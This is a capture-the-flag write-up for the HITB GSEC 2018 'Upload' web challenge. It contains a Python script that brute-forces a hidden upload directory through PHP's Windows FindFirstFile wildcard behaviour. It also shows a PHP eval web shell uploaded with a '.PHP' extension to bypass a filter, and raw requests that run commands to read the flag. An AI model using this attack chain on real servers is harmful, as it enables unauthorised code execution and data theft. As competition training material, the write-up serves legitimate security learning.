---
title: "HITB GSEC Qualifiers 2018 - Upload (Web)"
header:
  overlay_image: /assets/images/hitbgsecquals2018/upload/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Christopher Burns on Unsplash"
tags:
  - hitbgsecquals2018
  - writeup
  - web
---

The `FindFirstFile()` function in the Windows API can cause odd behaviour in
PHP applications running on Windows. We leverage this to leak information about
the path to a dynamically generated file.

## Challenge Description

```
Get shell !


http://47.90.97.18:9999
```

#### Points

253 Points

60 Solved

## Solution

The application allows a user to upload images and display the height and
widths. When grabbing the index of the web application we get the following:

```html
<head>
 <title>Where Path~?</title>
</head>
	<form action="upload.php" method="post" enctype="multipart/form-data">
        <input type="file" name="file" value="up"/>
        <input type="submit" value="upload" name="submit" />
    </form>
	<!--pic.php?filename=default.jpg-->
```

If we get the page `47.90.97.18:9999/pic.php?filename=default.jpg`, the server
returns:

```html
width=497</br>height=477
```

We can upload files like so:

```
POST /upload.php HTTP/1.1
Host: 47.90.97.18:9999
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101
Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://47.90.97.18:9999/
Content-Type: multipart/form-data; boundary=---------------------------
657249358323879871236420951
Content-Length: 338
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------657249358323879871236420951
Content-Disposition: form-data; name="file"; filename="testing.abc"
Content-Type: text/php

testing

-----------------------------657249358323879871236420951
Content-Disposition: form-data; name="submit"

upload
-----------------------------657249358323879871236420951--

```

This creates a file in a random directory and sets the filename to the epoch
with your chosen extension:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/7.0
X-Powered-By: PHP/5.6.35
Date: Fri, 13 Apr 2018 20:37:48 GMT
Connection: close
Content-Length: 17

1523651869.abc
```

We can exploit the way paths are resolved by PHP on Windows as described in
this article:
http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf.

First, we upload a valid JPEG image and obtain the filename. (1523653039.jpg)

```python
import requests
import string

url = "http://47.90.97.18:9999/pic.php?filename=../PATH<</1523653039.jpg"
r = requests.session()
dirname = ""
while True:
    for i in string.printable:
        print url.replace("PATH",dirname+i)
        out = r.get(url.replace("PATH",dirname+i))
        if out.text != "image error":
	    dirname+=i
	    print dirname
	    break
```

Running the script:

```shell
$ python brute.py
http://47.90.97.18:9999/pic.php?filename=../0<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../1<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../2<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../3<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../4<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../5<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../6<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../7<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../8<</1523653039.jpg
...
http://47.90.97.18:9999/pic.php?filename=../87194f13726af7cee27ba2cfe97b60dc<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../87194f13726af7cee27ba2cfe97b60dd<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../87194f13726af7cee27ba2cfe97b60de<</1523653039.jpg
http://47.90.97.18:9999/pic.php?filename=../87194f13726af7cee27ba2cfe97b60df<</1523653039.jpg
87194f13726af7cee27ba2cfe97b60df
```

The directory is 87194f13726af7cee27ba2cfe97b60df. Now, we can upload a PHP
script to evaluate arbitrary code. Note that we use the extension `.PHP` to
bypass the filter.

```
POST /upload.php HTTP/1.1
Host: 47.90.97.18:9999
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://47.90.97.18:9999/
Content-Type: multipart/form-data; boundary=---------------------------657249358323879871236420951
Content-Length: 362
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------657249358323879871236420951
Content-Disposition: form-data; name="file"; filename="attack.PHP"
Content-Type: text/php

<?php echo eval($_GET['cmd']);?>

-----------------------------657249358323879871236420951
Content-Disposition: form-data; name="submit"

upload
-----------------------------657249358323879871236420951--
```

We can now run PHP code.

```
GET /87194f13726af7cee27ba2cfe97b60df/1523653724.PHP?cmd=echo(phpversion()); HTTP/1.1
Host: 47.90.97.18:9999
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/7.0
X-Powered-By: PHP/5.6.35
Date: Fri, 13 Apr 2018 21:15:05 GMT
Connection: close
Content-Length: 6

5.6.35
```

We can grab the flag like so:

```
GET /87194f13726af7cee27ba2cfe97b60df/1523653724.PHP?cmd=foreach%20(glob(
"../flag*")%20as%20%24filename)%20%7B%20echo%20"%24filename%20%3D>%20"%3B
var_dump(file_get_contents(%24filename))%3B%20%7D; HTTP/1.1
Host: 47.90.97.18:9999
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/7.0
X-Powered-By: PHP/5.6.35
Date: Fri, 13 Apr 2018 21:16:21 GMT
Connection: close
Content-Length: 102

../flag.php => string(73) "<?php
echo "flag is here";
//HITB{e5f476c1e4c6dc66278db95f0b5a228a}
?>"
```


Flag: **HITB{e5f476c1e4c6dc66278db95f0b5a228a}**
